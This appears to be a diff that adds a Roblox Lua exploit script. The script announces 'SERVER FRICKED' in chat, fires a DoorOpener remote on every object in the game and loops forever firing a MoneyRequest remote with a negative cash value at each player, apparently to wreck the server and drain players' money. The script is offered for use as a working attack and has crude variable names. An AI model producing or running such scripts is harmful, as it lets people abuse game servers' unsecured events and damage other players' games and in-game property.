@@ -1,0 +1,26 @@
+print("████████╗███████╗███████╗███╗░░░███╗") 
+print("╚══██╔══╝██╔════╝██╔════╝████╗░████║") 
+print("░░░██║░░░█████╗░░█████╗░░██╔████╔██║") 
+print("░░░██║░░░██╔══╝░░██╔══╝░░██║╚██╔╝██║") 
+print("░░░██║░░░███████╗███████╗██║░╚═╝░██║") 
+print("░░░╚═╝░░░╚══════╝╚══════╝╚═╝░░░░░╚═╝")
+wait()
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SERVER FRICKED!!!!!", "All")
+wait()
+for _, GameFucked in pairs(game:GetDescendants()) do
+	game.ReplicatedStorage.DoorOpener:FireServer(GameFucked)
+end
+wait()
+while wait() do
+	Players = game:GetService("Players")
+	for i, plr in pairs(Players:GetPlayers()) do
+		local ShitAndCum = {
+			[1] = false,
+			[2] = -1,
+			[3] = "Cash",
+			[4] = plr
+		}
+
+		game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(ShitAndCum))
+	end
+end
